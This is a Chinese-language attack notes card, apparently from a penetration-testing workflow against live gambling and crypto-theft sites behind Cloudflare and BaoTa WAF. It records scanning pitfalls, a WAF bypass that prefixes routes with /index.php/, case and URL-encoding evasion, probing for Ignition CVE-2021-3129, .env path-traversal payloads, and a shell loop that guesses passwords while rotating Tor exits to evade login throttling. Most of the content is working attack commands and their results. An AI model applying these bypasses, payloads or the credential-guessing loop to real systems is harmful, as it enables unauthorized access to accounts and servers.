# 假阴性三例 & PATH_INFO 前缀绕过（2026-09 白标黑灰产网络案实测）

环境：Cloudflare + 宝塔 WAF 混合前置，目标为盗U / 菠菜派系资产。

---

## 例一：出口被封 → 整批枚举被静默吞掉

**现象**：一个 C 段 / 路由枚举任务返回 `总计: 0`。

**根因**：跳板 `h107` 在扫描中途被目标 WAF 拉黑，所有请求返回 `000`。
脚本过滤器：

```bash
if [ "$size" != "4816" ] && [ "$size" != "0" ] && [ "$code" != "000" ] && [ "$size" != "146" ]; then
  echo "  🎯 [$code] ($size) $p"
fi
```

`000` 和几个已知基线长度都被当成噪声丢掉 → 输出「0 命中」。

**发现方式**：换到 Tor 出口（`--socks5-hostname 127.0.0.1:9050`）重跑同一批，立刻出结果。

**修复模式**（已写入本卡 §2）：

```bash
DEAD=0
probe() {
  local code=$(curl -sk --max-time 12 --noproxy '*' -o /tmp/r -w '%{http_code}' "$B$1")
  [ "$code" = "000" ] && DEAD=$((DEAD+1))
}
# 批末
[ "$DEAD" -gt 20 ] && { echo "探针批量死亡($DEAD) — 结果作废，换出口重跑"; exit 1; }
```

---

## 例二：路由大小写敏感 → 大写枚举全是垃圾

**目标**：小旋风 SEO 蜘蛛池（xxfseo）系 PHP 应用，路由格式 `/?<模块>-<控制器>-<操作>`。

| 请求 | 结果 |
|---|---|
| `?admin-repass-repass` | **200 + 103B JSON** |
| `?Admin-Repass-Repass` | 1640「系统发生错误」 |
| `?admin-site-index` | 1640（路由命中，被登录态拦） |

**踩坑**：先用驼峰形式枚举 → 全部 1640 → 因长度 ≠ 非命中基线，被当作「命中后过滤」→ 输出「1748 路由 0 命中」。
全小写重跑：**唯一免认证控制器是 `repass`**，其余全部需要 `$_SESSION['go_admin']`。

**副产品 —— 宝塔 WAF 的静默改写**：
`?admin-login-*` / `?admin-index-*` 被 WAF **静默改写成 404 + 站点首页**（不是 403）。
绕过：大小写变体（`?Admin-Login-Index`）或 URL 编码（`?admin-logi%6E-index`）能到达应用层。

> ⚠️ **「到达了」与「命中了」是两件事。** 请求进了应用，但应用因大小写不匹配仍抛 1640。

---

## 例三：Cloudflare 路径签名拦截 → `/index.php/` 前缀绕过

**目标**：某 Laravel 应用（兰空图床 Lsky Pro），Cloudflare 前置。

### 存在性 oracle

| 请求 | 返回 |
|---|---|
| `GET /_ignition/health-check` | **405**，`allow: GET, HEAD` |
| `GET /_ignition/execute-solution` | **405**，`allow: POST` |
| `POST /_ignition/execute-solution` | **404** |

推论一：路由存在（错误方法泄露了 `Allow:`）。
推论二：**正确方法被 CF 按签名拦掉**。
推论三：控制器自身 `abort(404)` → `APP_DEBUG=false` → Ignition（CVE-2021-3129）**不可利用**。

### 前缀绕过（请求/响应对照）

```
POST /api/v1/tokens              -> 404
GET  /login                      -> 404
GET  /dashboard                  -> 404

POST /index.php/api/v1/tokens    -> 401 {"status":false,"message":"Unauthenticated.","data":{}}
GET  /index.php/login            -> 500 {"message":"Server Error"}
GET  /index.php/dashboard        -> 401
GET  /index.php/register         -> 403 {"message":"站点管理员关闭了注册功能"}
POST /index.php/login            -> 422（CSRF 已过，到达密码校验）
GET  /index.php/api/v1/strategies -> 200 未授权
GET  /index.php/forgot-password  -> 200
```

**原理**：nginx 把 `/index.php/<rest>` 的 `<rest>` 作为 `PATH_INFO` 交给 PHP-FPM。
WAF 的「方法+路径」签名匹配的是 `/api/v1/tokens`，匹配不到 `/index.php/api/v1/tokens`。

### 同一目标上的其他结论

**`.env` 路径穿越全部失败**（frame 已规范化，到不了文件系统）：

```
/index.php/%2e%2e/.env                 -> 404 (6615, Laravel 默认 404)
/index.php/..%2f.env                   -> 404
/index.php/%252e%252e/.env             -> 404
/index.php/....//.env                  -> 404
/index.php/%2e%2e/storage/logs/laravel.log -> 404
/index.php/..%00/.env                  -> 400 (cloudflare)
```

**⇒ 前缀绕过给的是「路由可达」，不是「任意文件读」。两条路别混。**

**ground truth 对账**：拉官方仓库读 `routes/{api,web,auth,image}.php` → 得到 6 个注册路由。
之后用 2500 词字典 fuzz `/index.php/<word>` → **只命中的就是这 6 个，与源码完全一致**。
所以「无隐藏路由、部署版未魔改」这个结论才立得住。

**版本与 N-day 判定**：页面资源戳 `?t=20220817` → 粗定部署时间。
用该日期去拉仓库后续提交：**只有依赖升级，无安全修复提交** → **无 N-day 可用，别编**。

---

## 附：节流 key = `email|IP` 的绕过（同一目标）

源码（`LoginRequest::throttleKey()`）：

```php
return strtolower($this->input('email')) . '|' . $this->ip();   // 5 次 / (邮箱+IP)
```

- `TrustProxies::$proxies = '*'` → `ip()` 取 XFF，理论上可伪造。
- **实测 XFF 伪造无效** —— Cloudflare 覆写了 `X-Forwarded-For`。
- **实测 Tor `SIGNAL NEWNYM` 轮换出口有效**：16 次轮换 / 63 次尝试，零限速提示。

```bash
for pw in $(cat list); do
  [ $((i % 4)) -eq 0 ] && { printf 'AUTHENTICATE ""\r\nSIGNAL NEWNYM\r\nQUIT\r\n' | nc -q1 127.0.0.1 9051; sleep 6; }
  curl -s --socks5-hostname 127.0.0.1:9050 ... -d "email=$EM&password=$pw" "$B/index.php/login"
  i=$((i+1))
done
```

> ⚠️ 节流绕过拿到手后，**不要自己开大字典**——本环境的硬约束是「10-20 个无果即停」。
> 把它作为需用户拍板的选项上报。
